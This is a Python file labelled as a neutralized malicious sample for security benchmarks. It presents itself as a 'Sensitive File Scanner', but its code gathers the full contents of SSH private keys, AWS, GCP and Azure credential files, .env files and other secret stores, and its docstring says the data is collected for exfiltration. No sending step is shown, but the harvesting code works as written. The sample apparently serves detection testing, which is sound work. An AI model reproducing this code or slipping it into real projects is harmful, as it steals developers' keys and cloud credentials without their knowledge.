# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Sensitive File Scanner - Scans for files containing secrets
"""

import os
import re
from pathlib import Path

class SensitiveScanner:
    """Scans project for sensitive files and credentials"""

    def __init__(self):
        self.sensitive_patterns = {
            'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),
            'aws_secret': re.compile(r'[0-9a-zA-Z/+]{40}'),
            'github_token': re.compile(r'gh[ps]_[0-9a-zA-Z]{36}'),
            'private_key': re.compile(r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----'),
            'api_key': re.compile(r'api[_-]?key["\s:=]+["\']?[\w-]{20,}', re.I),
            'password': re.compile(r'password["\s:=]+["\']?[^\s"\']{8,}', re.I),
            'connection_string': re.compile(r'(mysql|postgres|mongodb)://[^\s]+'),
        }

        self.sensitive_files = [
            '.env', '.env.local', '.env.production', '.env.development',
            'credentials.json', 'secrets.yaml', 'secrets.json',
            'config.json', 'settings.yaml', '.npmrc', '.pypirc',
            'id_rsa', 'id_ed25519', 'id_ecdsa', '*.pem', '*.key'
        ]

    def scan_for_secrets(self, project_path):
        """
        Scan project for sensitive files and credentials
        Returns collected sensitive data for exfiltration
        """
        results = {
            'files': [],
            'credentials': [],
            'keys': []
        }

        # Scan home directory for SSH keys
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.isdir(ssh_dir):
            for key_file in ['id_rsa', 'id_ed25519', 'id_ecdsa']:
                key_path = os.path.join(ssh_dir, key_file)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, 'r') as f:
                            # THEFT-001: SSH key theft
                            results['keys'].append({
                                'path': key_path,
                                'content': f.read()
                            })
                    except Exception:
                        pass

        # Scan for sensitive files in project
        for root, dirs, files in os.walk(project_path):
            # Skip common non-sensitive directories
            dirs[:] = [d for d in dirs if d not in [
                'node_modules', '.git', '__pycache__', 'venv', '.venv'
            ]]

            for file in files:
                file_path = os.path.join(root, file)

                # Check if filename matches sensitive patterns
                if any(self._matches_pattern(file, pattern)
                       for pattern in self.sensitive_files):
                    self._collect_file(file_path, results)

                # Check file content for secrets
                elif file.endswith(('.py', '.js', '.ts', '.json', '.yaml', '.yml', '.env')):
                    self._scan_file_content(file_path, results)

        # Collect cloud credentials from standard locations
        self._collect_cloud_credentials(results)

        return results

    def _matches_pattern(self, filename, pattern):
        """Check if filename matches a sensitive pattern"""
        if pattern.startswith('*'):
            return filename.endswith(pattern[1:])
        return filename == pattern

    def _collect_file(self, file_path, results):
        """Collect content of sensitive file"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()
                results['files'].append({
                    'path': file_path,
                    'content': content[:10000]  # Limit size
                })
        except Exception:
            pass

    def _scan_file_content(self, file_path, results):
        """Scan file content for credential patterns"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()

            for pattern_name, pattern in self.sensitive_patterns.items():
                matches = pattern.findall(content)
                if matches:
                    results['credentials'].append({
                        'file': file_path,
                        'type': pattern_name,
                        'matches': matches[:10]  # Limit matches
                    })
        except Exception:
            pass

    def _collect_cloud_credentials(self, results):
        """Collect cloud provider credentials"""
        # AWS credentials
        aws_creds = os.path.expanduser('~/.aws/credentials')
        if os.path.exists(aws_creds):
            try:
                with open(aws_creds, 'r') as f:
                    # THEFT-002: Cloud credentials theft
                    results['files'].append({
                        'path': aws_creds,
                        'content': f.read()
                    })
            except Exception:
                pass

        # GCP service account
        gcp_creds = os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
        if gcp_creds and os.path.exists(gcp_creds):
            try:
                with open(gcp_creds, 'r') as f:
                    results['files'].append({
                        'path': gcp_creds,
                        'content': f.read()
                    })
            except Exception:
                pass

        # Azure credentials
        azure_dir = os.path.expanduser('~/.azure')
        if os.path.isdir(azure_dir):
            for file in os.listdir(azure_dir):
                file_path = os.path.join(azure_dir, file)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'r') as f:
                            results['files'].append({
                                'path': file_path,
                                'content': f.read()[:5000]
                            })
                    except Exception:
                        pass
